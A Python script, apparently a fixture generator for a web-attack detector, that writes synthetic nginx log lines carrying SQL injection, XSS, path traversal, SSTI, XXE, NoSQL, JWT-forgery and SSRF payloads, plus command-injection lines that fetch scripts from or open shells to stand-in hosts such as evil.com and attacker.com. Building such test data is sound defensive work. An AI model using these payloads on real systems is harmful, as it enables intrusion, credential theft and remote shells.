#!/usr/bin/env python3
"""Gercek dunya saldiri nginx access log corpus + kategori manifest."""
from __future__ import annotations

import json
import os
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
CORPUS_TARGET = int(os.environ.get("REAL_ATTACK_CORPUS_LINES", "1000"))
OUT = ROOT / "corpus" / "real_attack_corpus.access"
MANIFEST = ROOT / "corpus" / "real_attack_manifest.json"

TS = "07/Jun/2026:14:30:01 +0300"
UA_SCAN = "sqlmap/1.8#stable (https://sqlmap.org)"
UA_NIKTO = "Nikto/2.5.0"
UA_NORMAL = "Mozilla/5.0 (compatible; EvilBot/1.0)"


def v4_last(host: int) -> int:
    """Gecerli IPv4 son oktet (1..254)."""
    return 1 + (int(host) % 254)


def line(ip: str, method: str, path: str, status: int = 200, ua: str = UA_NORMAL) -> str:
    return f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} 512 "-" "{ua}"'


def line_lg(
    ip: str,
    method: str,
    path: str,
    status: int = 401,
    bytes_: int = 128,
    ua: str = UA_NORMAL,
    xff: str = "-",
    body: str = "-",
) -> str:
    """nginx log_guardian format — $request_body dahil."""
    return (
        f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} {bytes_} "-" '
        f'"{ua}" "{xff}" "{body}"'
    )


def main() -> None:
    entries: list[dict[str, str]] = []

    def add(cat: str, ip: str, method: str, path: str, status: int = 200, ua: str = UA_NORMAL) -> None:
        entries.append({"category": cat, "line": line(ip, method, path, status, ua)})

    # SQLi (URL)
    sqli_paths = [
        "/search?q=1'+OR+'1'='1",
        "/search?q=1%27+UNION+SELECT+null,null--",
        "/api/users?id=1;DROP+TABLE+users--",
        "/product?id=1+AND+1=1",
        "/product?id=1+AND+SLEEP(5)",
        "/login?user=admin'--",
        "/login?pass=%27+OR+1%3D1--",
        "/?id=1'+UNION+ALL+SELECT+@@version,null--",
        "/report?sort=id;WAITFOR+DELAY+'0:0:5'--",
        "/filter?name=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "/api?q=1';EXEC+xp_cmdshell('whoami')--",
        "/items?cat=1+OR+1=1",
        "/news?id=-1+UNION+SELECT+1,2,3,4,5--",
        "/shop?item=1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(3)))a)--",
        "/data?x=1'+OR+1=1#",
        "/v1/query?id=1'+OR+'1'='1",
        "/admin?id=1+UNION+SELECT+password+FROM+users--",
        "/download?file=1';DELETE+FROM+logs--",
        "/search?term=')+UNION+SELECT+null,table_name+FROM+information_schema.tables--",
        "/api/v1/search?q=1'+OR+'x'='x",
        "/arama?kelime=1%27+AND+1%3D1--",
        "/urun?id=1;SELECT+SLEEP(2)--",
        "/siparis?no=1+UNION+SELECT+1,2,3--",
        "/api/ara?q=admin%27+OR+%271%27%3D%271",
        "/odeme?kart=1%27+AND+SUBSTRING(version(),1,1)=%275%27--",
    ]
    for i, p in enumerate(sqli_paths):
        add("sqli", f"198.51.100.{v4_last(10 + i % 40)}", "GET", p)

    # XSS
    xss_paths = [
        "/comment?text=<script>alert(1)</script>",
        "/profile?name=<img+src=x+onerror=alert(1)>",
        "/search?q=<svg/onload=alert(document.cookie)>",
        "/post?body=javascript:alert(1)",
        "/api/echo?msg=%3Cscript%3E",
        "/guestbook?entry=<body+onload=alert('xss')>",
        "/redirect?url=javascript:alert(1)",
        "/page?title=<iframe+src=evil.com>",
        "/search?x=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
        "/form?input=<details+open+ontoggle=alert(1)>",
        "/u/avatar?url=data:text/html,<script>alert(1)</script>",
        "/share?link=%3Cmath%3E%3Cmi/xlink:href=javascript:alert(1)%3E",
        "/api/render?html=<img+src=1+onerror=confirm(1)>",
        "/widget?config=<script>fetch('//evil')</script>",
        "/preview?doc=<embed+src=javascript:alert(1)>",
    ]
    for i, p in enumerate(xss_paths):
        add("xss", f"203.0.113.{v4_last(20 + i % 30)}", "GET", p)

    # Path traversal / LFI
    lfi_paths = [
        "/download?file=../../../etc/passwd",
        "/img?path=..%2f..%2f..%2fetc%2fpasswd",
        "/static/....//....//etc/passwd",
        "/view?template=../../../../etc/shadow",
        "/include?page=php://filter/convert.base64-encode/resource=index.php",
        "/load?f=/var/log/nginx/access.log",
        "/read?path=file:///etc/passwd",
        "/asset?url=....//....//windows/win.ini",
        "/api/file?name=..\\..\\..\\boot.ini",
        "/export?path=....//....//proc/self/environ",
        "/theme?file=../../../../etc/passwd%00",
        "/backup?dir=../../../root/.ssh/id_rsa",
    ]
    for i, p in enumerate(lfi_paths):
        add("lfi", f"192.0.2.{v4_last(30 + i % 20)}", "GET", p)

    # RCE / command injection
    rce_paths = [
        "/cgi-bin/test.cgi?cmd=;cat+/etc/passwd",
        "/api/exec?run=|whoami",
        "/ping?host=127.0.0.1;id",
        "/tool?input=$(curl+evil.com/shell.sh)",
        "/debug?cmd=`id`",
        "/run?script=;wget+http://evil.com/malware",
        "/shell?c=system('uname+-a')",
        "/api?func=eval($_GET[x])",
        "/convert?file=|nc+-e+/bin/sh+attacker.com+4444",
        "/admin?action=;rm+-rf+/",
        "/test?x=|/bin/bash+-i",
        "/proxy?url=file:///etc/passwd",
    ]
    for i, p in enumerate(rce_paths):
        add("rce", f"198.18.0.{v4_last(40 + i % 15)}", "GET", p)

    # Scanner / bot UA
    scanner_hits = [
        ("/.env", UA_SCAN),
        ("/.git/config", UA_NIKTO),
        ("/wp-config.php.bak", UA_SCAN),
        ("/phpmyadmin/", UA_NIKTO),
        ("/server-status", "masscan/1.3"),
        ("/.aws/credentials", UA_SCAN),
        ("/actuator/env", "Acunetix-Product"),
        ("/config.json", UA_NIKTO),
        ("/backup.sql", UA_SCAN),
        ("/admin.php", UA_SCAN),
        ("/xmlrpc.php", UA_SCAN),
        ("/.svn/entries", UA_NIKTO),
        ("/telescope/requests", "Nuclei - Open-source"),
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", UA_SCAN),
        ("/cgi-bin/luci", UA_NIKTO),
    ]
    for i, (p, ua) in enumerate(scanner_hits):
        add("scanner", f"203.0.113.{v4_last(100 + i)}", "GET", p, 404, ua)

    # Brute/auth abuse — login+SQLi (flood LIVE=1; tum path URL-safe)
    auth_paths = [
        "/login?user=admin%27--&pass=x",
        "/wp-login.php?log=admin%27+OR+1%3D1--&pwd=x",
        "/api/login?username=admin%27+OR+%271%27%3D%271",
        "/auth?email=test%40test.com%27--",
        "/signin?user=admin%27+UNION+SELECT+1,2--",
        "/oauth/token?client_id=1%27+OR+1%3D1--",
        "/account/login?pass=%27+OR+1%3D1--",
        "/api/v1/auth?user=admin%27--",
        "/giris?kullanici=admin%27--",
        "/uye/giris?email=admin%27+OR+1%3D1--",
    ]
    for i, p in enumerate(auth_paths):
        add("brute", f"198.51.100.{v4_last(150 + i)}", "POST", p, 401 if i % 2 else 200)

    # SSRF (metadata / internal)
    ssrf_paths = [
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?target=http://metadata.google.internal/computeMetadata/v1/",
        "/image?src=http://127.0.0.1:8080/admin",
        "/api/import?uri=file:///etc/passwd",
        "/webhook?callback=http://10.0.0.5/internal",
        "/render?url=dict://127.0.0.1:6379/info",
        "/preview?link=gopher://192.168.1.1:25/",
        "/avatar?u=http://localhost/server-status",
    ]
    for i, p in enumerate(ssrf_paths):
        add("ssrf", f"10.0.0.{v4_last(200 + i)}", "GET", p)

    # TR e-ticaret / panel tarama (scanner UA + tipik path)
    tr_paths = [
        ("/yonetim/login.php", UA_NIKTO),
        ("/panel/admin/index.php", UA_SCAN),
        ("/admin/giris.asp", UA_SCAN),
        ("/magaza/admin/", UA_NIKTO),
        ("/eticaret/panel/", UA_SCAN),
        ("/wp-admin/setup-config.php", UA_SCAN),
        ("/phpmyadmin/index.php", UA_NIKTO),
        ("/.env.backup", UA_SCAN),
    ]
    for i, (p, ua) in enumerate(tr_paths):
        add("tr_scan", f"185.220.101.{v4_last(i)}", "GET", p, 403, ua)

    # GraphQL / API abuse (waf graphql_patterns ile eslesen)
    api_paths = [
        '/graphql?query={__schema{types{name}}}',
        "/graphql?query=query{__type(name:%22User%22){fields{name}}}",
        "/api/graphql?query=IntrospectionQuery",
        "/v1/graphql?query={__typename}",
        "/graphql?query=mutation{deleteUser(id:1)}",
        "/api/graphql?query={__schema{queryType{name}}}",
        "/graphql?query=query{__schema{types{fields{name}}}}",
        "/api/gql?query=__schema",
    ]
    for i, p in enumerate(api_paths):
        add("api_abuse", f"10.0.0.{v4_last(50 + i)}", "GET", p)

    # POST SQLi — log_guardian $request_body (offline replay)
    post_attacks = [
        ("POST", "/api/login", "username=admin%27+OR+1%3D1--&password=x"),
        ("POST", "/api/v1/auth/login", "user=admin&pass=%27+OR+%271%27%3D%271"),
        ("POST", "/wp-login.php", "log=admin%27--&pwd=test&wp-submit=Log+In"),
        ("POST", "/login", "email=test%40x.com%27+UNION+SELECT+1--&password=y"),
        ("POST", "/giris", "kullanici=admin%27+OR+1%3D1--&sifre=z"),
        ("POST", "/api/graphql", "query=%7B__schema%7Btypes%7Bname%7D%7D%7D"),
        ("POST", "/api/v1/search", "q=1%27+AND+SLEEP(2)--"),
        ("POST", "/account/login", "username=root&password=%27+OR+1%3D1--"),
        ("POST", "/oauth/token", "grant_type=password&username=admin%27--"),
        ("POST", "/api/users", "name=test&role=admin%27+OR+1%3D1--"),
    ]
    for i, (method, path, body) in enumerate(post_attacks):
        entries.append(
            {
                "category": "post_sqli",
                "line": line_lg(
                    f"203.0.113.{v4_last(210 + i)}",
                    method,
                    path,
                    401 if i % 2 else 200,
                    body=body,
                ),
            }
        )

    # Dağıtık saldırı — ayni scanner UA, farkli IP (CrowdSec farki: fingerprint cluster)
    dist_payloads = [
        "/?id=1%27+OR+1%3D1--",
        "/search?q=1%27+UNION+SELECT+1,2--",
        "/api/users?id=1;WAITFOR+DELAY+%270:0:3%27--",
        "/product?id=1+AND+SLEEP(2)--",
        "/admin?id=-1+UNION+SELECT+password,2+FROM+users--",
    ]
    for i in range(80):
        ip = f"45.33.{i // 256}.{i % 256}"
        path = dist_payloads[i % len(dist_payloads)]
        add("distributed", ip, "GET", path, 403 if i % 3 else 200, UA_SCAN)

    # Ek scanner path (recon + CVE probe)
    scanner_extra = [
        ("/.well-known/security.txt", UA_NIKTO),
        ("/server-info", "masscan/1.3"),
        ("/debug/default/view", UA_SCAN),
        ("/api/swagger.json", "Nuclei - Open-source"),
        ("/console/", UA_NIKTO),
        ("/.dockerenv", UA_SCAN),
        ("/api/v1/namespaces", UA_SCAN),
        ("/solr/admin/", UA_NIKTO),
        ("/jenkins/login", UA_SCAN),
        ("/manager/html", UA_NIKTO),
    ]
    for i, (p, ua) in enumerate(scanner_extra):
        add("scanner", f"203.0.113.{v4_last(120 + i)}", "GET", p, 404, ua)

    # Ek SSRF (metadata / loopback)
    ssrf_extra = [
        "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "/proxy?u=http://127.0.0.1:22/",
        "/img?src=http://[::1]/admin",
        "/api/import?uri=http://localhost:9200/",
        "/webhook?url=http://10.0.0.1:2375/containers/json",
        "/render?link=http://metadata.google.internal/",
        "/avatar?u=http://127.0.0.1:6379/",
        "/preview?target=http://169.254.169.254/",
    ]
    for i, p in enumerate(ssrf_extra):
        add("ssrf", f"10.0.0.{v4_last(210 + i)}", "GET", p)

    # Ek POST SQLi ($request_body)
    post_extra = [
        ("POST", "/api/v2/login", "email=admin%27+OR+1%3D1--&password=z"),
        ("POST", "/panel/giris", "user=root%27--&pass=1"),
        ("POST", "/api/auth", "username=%27+UNION+SELECT+1,2--&password=x"),
        ("POST", "/checkout", "card=1%27+AND+SLEEP(1)--&cvv=1"),
        ("POST", "/api/register", "name=test%27+OR+1%3D1--&mail=a@b.c"),
        ("POST", "/admin/login", "login=admin%27+OR+%271%27%3D%271&pwd=x"),
        ("POST", "/api/token", "refresh=abc%27+OR+1%3D1--"),
        ("POST", "/siparis/olustur", "musteri=1%27+UNION+SELECT+null--"),
    ]
    for i, (method, path, body) in enumerate(post_extra):
        entries.append(
            {
                "category": "post_sqli",
                "line": line_lg(f"203.0.113.{v4_last(230 + i)}", method, path, 401, body=body),
            }
        )

    # Ek TR panel tarama
    tr_extra = [
        ("/cpanel/login", UA_SCAN),
        ("/plesk/login.php", UA_NIKTO),
        ("/administrator/index.php", UA_SCAN),
        ("/kurumsal/yonetim/", UA_NIKTO),
        ("/shop/admin/login.php", UA_SCAN),
        ("/prestashop/admin", UA_NIKTO),
        ("/opencart/admin/", UA_SCAN),
    ]
    for i, (p, ua) in enumerate(tr_extra):
        add("tr_scan", f"185.220.102.{v4_last(i)}", "GET", p, 403, ua)

    # Ek GraphQL / API abuse
    api_extra = [
        "/v2/graphql?query={__schema{directives{name}}}",
        "/api/gql?query={__typename}",
        "/graphql?query=mutation{updateUser(id:1,role:admin)}",
        "/api/graphql?query={__schema{queryType{fields{name}}}}",
        "/gql/graphql?query={__schema{types{name}}}",
        "/api/v3/graphql?query=IntrospectionQuery",
        "/graphql/console?query={__schema{mutationType{name}}}",
    ]
    for i, p in enumerate(api_extra):
        add("api_abuse", f"10.0.0.{v4_last(60 + i)}", "GET", p)

    # Ek LFI / path traversal
    lfi_extra = [
        "/file?path=..%2f..%2f..%2fetc%2fpasswd",
        "/download?name=....//....//etc/passwd",
        "/view?doc=../../../../var/www/html/wp-config.php",
        "/static?f=..%5c..%5c..%5cwindows%5cwin.ini",
        "/load?resource=php://filter/read=convert.base64-encode/resource=index.php",
        "/read?file=file:///etc/hosts",
        "/asset?path=../../../proc/self/cmdline",
        "/export?dir=....//....//root/.bash_history",
    ]
    for i, p in enumerate(lfi_extra):
        add("lfi", f"192.0.2.{v4_last(50 + i)}", "GET", p)

    # Ek RCE / command injection
    rce_extra = [
        "/diag?cmd=;uname+-a",
        "/api/run?x=|id",
        "/tool?input=%24(whoami)",
        "/exec?command=;curl+http://evil.test/s",
        "/ping?host=127.0.0.1%26id",
        "/shell?c=%60cat+/etc/passwd%60",
        "/debug?run=|nc+attacker.test+4444",
        "/convert?args=;wget+evil.test/x.sh",
    ]
    for i, p in enumerate(rce_extra):
        add("rce", f"198.18.0.{v4_last(55 + i)}", "GET", p)

    # Ek SQLi (benzersiz path — tekrarli UNION dongusu yerine cesitlilik)
    sqli_extra = [
        "/api/search?filter=1%27+AND+1%3D1--",
        "/reports?sort=1;SELECT+pg_sleep(2)--",
        "/users?role=admin%27+OR+%271%27%3D%271",
        "/catalog?cat=1%27+UNION+SELECT+null,version()--",
        "/billing?inv=1%27+AND+SUBSTRING(@@version,1,1)=%275%27--",
        "/crm?lead=1%27+OR+1%3D1%23",
        "/erp?doc=1%27;EXEC+master..xp_dirtree+%27C:%27--",
        "/helpdesk?ticket=1%27+UNION+ALL+SELECT+1,2,3--",
        "/forum?topic=1%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,user()))--",
        "/wiki?page=1%27+OR+%271%27%3D%271",
        "/stats?dim=1%27+UNION+SELECT+table_name,null+FROM+information_schema.tables--",
    ]
    for i, p in enumerate(sqli_extra):
        add("sqli", f"198.51.100.{v4_last(250 + i)}", "GET", p)

    # Ek SQLi varyantlari (corpus buyutme)
    for i in range(80):
        add(
            "sqli",
            f"198.51.100.{v4_last(200 + i)}",
            "GET",
            f"/api/v2/item?id=1%27+UNION+SELECT+{i}%2C2--",
        )

    # Ek XSS varyantlari
    xss_extra = [
        "/api/echo?x=%3Cscript%3Ealert(1)%3C/script%3E",
        "/widget?name=%3Cimg+src=x+onerror=alert(1)%3E",
        "/v2/render?html=%3Csvg/onload=alert(1)%3E",
        "/share?text=%3Cbody+onload=alert(1)%3E",
        "/embed?src=%3Ciframe+src=javascript:alert(1)%3E",
    ]
    for i in range(40):
        add("xss", f"203.0.113.{v4_last(50 + i)}", "GET", xss_extra[i % len(xss_extra)])

    # 2024-2026 CVE-style probe paths
    cve_paths = [
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", UA_SCAN),
        ("/.git/HEAD", UA_NIKTO),
        ("/containers/json", UA_SCAN),
        ("/actuator/health", "Acunetix-Product"),
        ("/api/v1/pods", UA_SCAN),
        ("/_ignition/execute-solution", UA_NIKTO),
        ("/wp-content/debug.log", UA_SCAN),
        ("/.env.production", UA_SCAN),
        ("/api/swagger-ui.html", UA_NIKTO),
        ("/server/phpinfo.php", UA_SCAN),
        ("/api/v1/secrets", UA_SCAN),
        ("/debug/pprof/", UA_NIKTO),
        ("/.DS_Store", UA_SCAN),
        ("/backup.zip", UA_SCAN),
        ("/config/database.yml", UA_NIKTO),
    ]
    for i, (p, ua) in enumerate(cve_paths):
        add("scanner", f"203.0.113.{v4_last(140 + i)}", "GET", p, 404, ua)

    # Ek brute/login abuse
    for i in range(10):
        add(
            "brute",
            f"198.51.100.{v4_last(160 + i)}",
            "POST",
            f"/api/v2/auth?user=admin%27+OR+1%3D1--&pass=x{i}",
            401,
        )

    # Ek post_sqli body varyantlari
    post_more = [
        ("POST", "/api/session", "token=abc%27+OR+1%3D1--"),
        ("POST", "/cart/add", "sku=1%27+UNION+SELECT+1--"),
        ("POST", "/api/reset", "email=x%27+OR+1%3D1--"),
        ("POST", "/payment", "amount=1%27+AND+SLEEP(1)--"),
        ("POST", "/api/comments", "body=test%27+OR+1%3D1--"),
        ("POST", "/subscribe", "mail=a%27+UNION+SELECT+1--"),
        ("POST", "/api/profile", "bio=%27+OR+1%3D1--"),
        ("POST", "/iletisim", "mesaj=1%27+OR+1%3D1--"),
        ("POST", "/api/feedback", "text=admin%27--"),
        ("POST", "/destek/ticket", "konu=1%27+UNION+SELECT+null--"),
    ]
    for i, (method, path, body) in enumerate(post_more):
        entries.append(
            {
                "category": "post_sqli",
                "line": line_lg(f"203.0.113.{v4_last(240 + i)}", method, path, 403, body=body),
            }
        )

    # Corpus 500 hedefi — ek varyant donguleri
    for i in range(15):
        add("ssrf", f"10.0.0.{v4_last(220 + i)}", "GET", f"/fetch?url=http://169.254.169.254/{i}")
    for i in range(15):
        add(
            "api_abuse",
            f"10.0.0.{v4_last(70 + i)}",
            "GET",
            f"/graphql?query={{__schema{{types{{name}}}}}}&v={i}",
        )
    for i in range(15):
        add("lfi", f"192.0.2.{v4_last(60 + i)}", "GET", f"/file?path=..%2f..%2fetc%2fpasswd%2f{i}")
    for i in range(15):
        add("rce", f"198.18.0.{v4_last(70 + i)}", "GET", f"/run?cmd=;id+{i}")
    for i in range(15):
        add("tr_scan", f"185.220.103.{v4_last(i)}", "GET", f"/panel{i}/admin/", 403, UA_SCAN)

    # --- Corpus 1K: yeni kategoriler + cesitlilik ---
    ssti_paths = [
        "/render?name={{7*7}}",
        "/preview?template={{config.__class__.__init__.__globals__}}",
        "/email?body=${7*7}",
        "/doc?tpl=<%=7*7%>",
        "/view?layout={{''.__class__.__mro__[1].__subclasses__()}}",
        "/report?fmt={{request.application.__globals__}}",
        "/page?x={{lipsum.__globals__}}",
        "/export?skin={{cycler.__init__.__globals__}}",
        "/widget?skin={{joiner.__init__.__globals__}}",
        "/api/render?html={{7*'7'}}",
        "/template?f=..%2f..%2fetc%2fpasswd",
        "/mail?msg=${T(java.lang.Runtime).getRuntime().exec('id')}",
        "/velocity?x=#set($x=7*7)$x",
        "/freemarker?x=${7*7}",
        "/thymeleaf?x=__${7*7}__",
        "/jinja?x={{config.items()}}",
        "/smarty?x={7*7}",
        "/pebble?x={{7*7}}",
        "/mustache?x={{7*7}}",
        "/handlebars?x={{7*7}}",
        "/twig?x={{7*7}}",
        "/erb?x=<%=7*7%>",
        "/pug?x=#{7*7}",
        "/nunjucks?x={{7*7}}",
        "/liquid?x={{7*7}}",
    ]
    for i, p in enumerate(ssti_paths):
        add("ssti", f"198.51.101.{v4_last(10 + i)}", "GET", p)

    xxe_paths = [
        "/upload?xml=%3C!DOCTYPE+foo+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E%3Cfoo%3E%26x%3B%3C/foo%3E",
        "/api/parse?data=%3C!ENTITY+xxe+SYSTEM+%22http://evil.test%22%3E",
        "/import?xml=%3C!DOCTYPE+a+[%3C!ENTITY+%25+remote+SYSTEM+%22http://evil.test/dtd%22%3E%25remote%3B%5D%3E",
        "/soap?body=%3C!DOCTYPE+foo+[%3C!ENTITY+x+SYSTEM+%22file:///etc/shadow%22%3E%5D%3E",
        "/feed?url=data:text/xml,%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E",
        "/convert?fmt=xml&src=%3C!DOCTYPE+a+[%3C!ENTITY+x+SYSTEM+%22php://filter/convert.base64-encode/resource=index.php%22%3E%5D%3E",
        "/api/xml?payload=%3C!DOCTYPE+test+[%3C!ENTITY+%25+sp+SYSTEM+%22file:///etc/passwd%22%3E%25sp%3B%5D%3E",
        "/sync?doc=%3C!ENTITY+x+SYSTEM+%22expect://id%22%3E",
        "/batch?xml=%3C!DOCTYPE+b+[%3C!ENTITY+x+SYSTEM+%22file:///proc/self/environ%22%3E%5D%3E",
        "/edi?msg=%3C!DOCTYPE+c+[%3C!ENTITY+x+SYSTEM+%22http://169.254.169.254/%22%3E%5D%3E",
        "/config?import=%3C!ENTITY+x+SYSTEM+%22file:///etc/hosts%22%3E",
        "/report?xml=%3C!DOCTYPE+d+[%3C!ENTITY+x+SYSTEM+%22file:///var/www/.env%22%3E%5D%3E",
        "/api/v1/xml?data=%3C!DOCTYPE+e+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E",
        "/webhook/xml?body=%3C!ENTITY+x+SYSTEM+%22http://127.0.0.1:6379/%22%3E",
        "/transform?xsl=%3C!DOCTYPE+f+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E",
        "/parse?file=%3C!DOCTYPE+g+[%3C!ENTITY+x+SYSTEM+%22file:///root/.ssh/id_rsa%22%3E%5D%3E",
        "/api/import?xml=%3C!DOCTYPE+h+[%3C!ENTITY+x+SYSTEM+%22file:///etc/nginx/nginx.conf%22%3E%5D%3E",
        "/sso/saml?assertion=%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E",
        "/office?doc=%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E",
        "/rss?feed=%3C!DOCTYPE+i+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E",
    ]
    for i, p in enumerate(xxe_paths):
        add("xxe", f"203.0.114.{v4_last(10 + i)}", "GET", p)

    # URL-safe: log satirinda ham JSON tırnagi yok (parser kirilmasin)
    nosql_paths = [
        "/api/users?filter[$gt]=",
        "/api/login?user[$ne]=x&password[$ne]=y",
        "/search?q[$where]=sleep(5000)",
        "/api/find?query[$regex]=.*",
        "/mongo?filter[$or][0][a]=1",
        "/api/auth?username[$ne]=&password[$ne]=",
        "/users?where[$gt]=",
        "/api/v1/query?filter[$nin][0]=x",
        "/data?match[$exists]=true",
        "/api/search?username[$regex]=^admin",
        "/login?user[$regex]=.*&pass[$regex]=.*",
        "/api/items?filter[$gt]=0",
        "/api/collection?where[$and][0][a]=1",
        "/find?criteria[$not][x]=1",
        "/api/user?email[$gt]=&password[$gt]=",
        "/search?json[$where]=this.password",
        "/api/query?filter[$expr][$gt][0]=$a",
        "/users?filter[$jsonSchema][required][0]=pwd",
        "/api/login?[$or][0][user]=admin",
        "/mongo/users?filter[password][$regex]=^.",
        "/api/auth?user[$in][0]=admin",
        "/search?filter[$text][$search]=admin",
        "/api/data?where[$comment]=evil",
        "/query?filter[$type]=string",
        "/api/find?username[$eq]=admin",
        "/users?filter[$mod][0]=2",
        "/api/search?q[$size]=0",
        "/login?filter[$all][0]=x",
        "/api/v2/users?where[$elemMatch][role]=admin",
        "/graphql?query=users(filter:password[$ne]=null)",
    ]
    for i, p in enumerate(nosql_paths):
        add("nosql", f"198.18.1.{v4_last(10 + i)}", "GET", p)

    proto_paths = [
        "/api/merge?__proto__[admin]=1",
        "/api/user?constructor[prototype][role]=admin",
        "/graphql?query=mutation{__proto__{isAdmin:true}}",
        "/api/v1/config?__proto__[polluted]=yes",
        "/login?__proto__[password]=x",
        "/api/object?constructor.prototype.admin=1",
        "/api/clone?payload[__proto__][evil]=1",
        "/api/update?data[constructor][prototype][isAdmin]=true",
        "/api/v2/user?filter[__proto__][role]=admin",
        "/api/merge?obj[__proto__][polluted]=1",
        "/api/patch?__proto__[canEdit]=true",
        "/api/save?nested[__proto__][admin]=1",
        "/api/import?json[constructor][prototype][root]=1",
        "/api/bind?__proto__[acl]=all",
        "/api/extend?target[__proto__][superuser]=1",
        "/api/assign?__proto__[permissions]=*",
        "/api/override?payload[constructor.prototype][admin]=true",
        "/api/elevate?__proto__[isAdmin]=1",
    ]
    for i, p in enumerate(proto_paths):
        add("prototype_pollution", f"203.0.118.{v4_last(10 + i)}", "GET", p)

    jwt_paths = [
        "/api/me?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "/auth?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.evil",
        "/api/session?access_token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.x",
        "/oauth/verify?token=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJldmlsIn0.sig",
        "/api/v1/user?bearer=eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.x",
        "/profile?session=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.x",
        "/api/gateway?jwt=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxfQ.x",
        "/sso/callback?token=eyJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImFkbWluQHguY29tIn0.x",
        "/api/refresh?token=eyJhbGciOiJIUzI1NiJ9.eyJyZWZyZXNoIjp0cnVlfQ.x",
        "/admin?jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc19hZG1pbiI6dHJ1ZX0.x",
        "/api/v2/auth?token=eyJhbGciOiJIUzI1NiJ9.eyJncm91cCI6ImFkbWluIn0.x",
        "/gateway?access=eyJhbGciOiJIUzI1NiJ9.eyJzY29wZSI6ImFkbWluIn0.x",
        "/api/protected?jwt=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InJvb3QifQ.x",
        "/login/sso?token=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.evil",
        "/api/account?bearer=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.x",
        "/auth/verify?jwt=eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.evil",
        "/api/userinfo?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.x",
        "/session/validate?jwt=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.x",
        "/api/v3/me?access_token=eyJhbGciOiJIUzI1NiJ9.eyJpc19hZG1pbiI6dHJ1ZX0.x",
        "/oauth/token?jwt=eyJhbGciOiJIUzI1NiJ9.eyJzY29wZSI6ImFkbWluIn0.x",
    ]
    for i, p in enumerate(jwt_paths):
        add("jwt_abuse", f"10.0.1.{v4_last(10 + i)}", "GET", p)

    # 2026 — path traversal varyantlari (cift encode, wrapper, null)
    pt_variant_paths = [
        "/static?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/download?path=..%252f..%252f..%252fetc%252fpasswd",
        "/asset?url=....//....//....//etc/passwd",
        "/read?f=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/view?doc=..\\..\\..\\windows\\win.ini",
        "/include?page=....//....//etc/passwd%00.jpg",
        "/files?p=..;/..;/etc/passwd",
        "/media?src=zip://../../etc/passwd",
        "/export?path=file:///etc/passwd%23",
        "/load?template=..%5c..%5c..%5cetc%5cpasswd",
        "/api/fs?path=....//....//proc/self/environ",
        "/backup?dir=%2e%2e%2f%2e%2e%2froot%2f.ssh%2fid_rsa",
        "/theme?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        "/img?src=..%2f..%2f..%2fvar%2flog%2fauth.log",
        "/doc?f=..%25252f..%25252fetc%25252fpasswd",
    ]
    for i, p in enumerate(pt_variant_paths):
        add("path_traversal_variant", f"192.0.2.{v4_last(140 + i)}", "GET", p)

    # JWT alg confusion / kid injection (jwt_abuse'dan ayri — alg tespiti)
    jwt_alg_paths = [
        "/api/me?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
        "/auth?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
        "/api/v1/user?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
        "/oauth/verify?token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.evil",
        "/api/session?bearer=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZX0.evil",
        "/gateway?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "/api/protected?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.",
        "/sso/callback?access=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6ImFkbWluIn0.",
